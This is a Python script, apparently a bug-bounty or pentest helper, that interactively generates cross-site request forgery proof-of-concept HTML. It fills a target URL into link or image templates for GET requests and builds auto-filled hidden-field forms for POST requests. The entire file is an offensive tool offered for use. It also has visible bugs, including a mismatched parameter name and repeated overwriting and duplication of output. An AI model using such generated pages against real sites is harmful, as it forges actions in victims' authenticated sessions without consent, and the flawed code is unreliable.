import re
print("\033[1;31;40m----------[+] CSRF POC GENERATOR BY RC [+]----------")
res=0
def get(url,method):
	if method=="1":
		o = open("output.html","w")
		data = open("temp.html").read()
		o.write(re.sub("change",url,data))
		o.close()
		data=open("output.html").read()
		print("\033[1;37;40m"+"Copy The HTML CODE BELOW\n"+data)
		print("\nAlso Saved As output.html")
	elif method=='2':
		o = open("output.html","w")
		data = open("temp1.html").read()
		o.write(re.sub("change",url,data))
		o.close()
		data=open("output.html").read()
		print("\033[1;37;40m"+"Copy The HTML CODE BELOW\n"+data)
		print("\nAlso Saved As output.html")
	else:
		print("[+] Wrong Input [+]")
def post(atc,name,val):
		o = open("postoutput.html","w")
		data = open("post.html").read()
		o.write(re.sub("njk",act,data))
		#o.write(data)
		data=open("postoutput.html").read()
		o=open("postoutput.html","a")
		ttw=f"\n  <input type=\"hidden\" name=\"{name}\" value=\"{val}\">"
		o.write(ttw)
		o.close()
		#print("\033[1;33;40m [+] POC File Saved As outputpost.html [+]")
		#a=open("postoutput.html").read()
		#print(a)



print('\nSelect Option From Below : ')
print("\n\033[1;33;40m1. For GET Request")
print("\n\033[1;34;40m2. For POST Request")
ask = input("\n\033[1;32;40mEnter Here : ")
if ask == "1":
	print("\n\033[1;31;40m[+]------- Enter The Request URL --------[+]")
	url = input("\n\033[1;32;40mEnter Here : ")
	print("\n\033[1;31;40mSelect From The Below")
	print("\n\033[1;33;40m1. For <a> Based ")
	print("\n\033[1;34;40m2. For <img> Based")
	method = input("\n\033[1;32;40mEnter Here : ")
	get(url,method)
elif ask=="2":
	print("\n\033[1;31;40m[+]---------- Enter The Action URL ----------[+]")
	act=input("\n\033[1;32;40mEnter Here : ")
	print("\n\033[1;31;40m[+]---------- How Much Inputs You Want? ----------[+]")
	inp=int(input("\n\033[1;32;40mEnter Here : "))
	inps=0
	for i in range(inp):
		print("\n\033[1;31;40m[+]---------- Enter The name= ----------[+]")
		name=input("\n\033[1;32;40mEnter Here : ")
		print("\n\033[1;31;40m[+]---------- Enter The Value For It ----------[+]")
		val=input("\n\033[1;32;40mEnter Here : ")
		inps+=1
		import time
		time.sleep(.21)
		post(act,name,val)
		if inps==inp:
			f=open('postoutput.html','a')
			TTw="\n<input type=\'submit\' value=\'Go!\' />"
			Ttw="\n  </form>\n  </body>\n</html>"
			f.write(TTw + Ttw)
			print("\033[1;33;40m [+] POC File Saved As outputpost.html [+]")
		else:
			#post(act,name,val)
			f=open('postoutput.html','a')
			r=0
			while r!=1:
				ttk=f"\n<input type=\'hidden\' name=\"{name}\" value=\"{val}\">"
				f.write(ttk)
				r+=1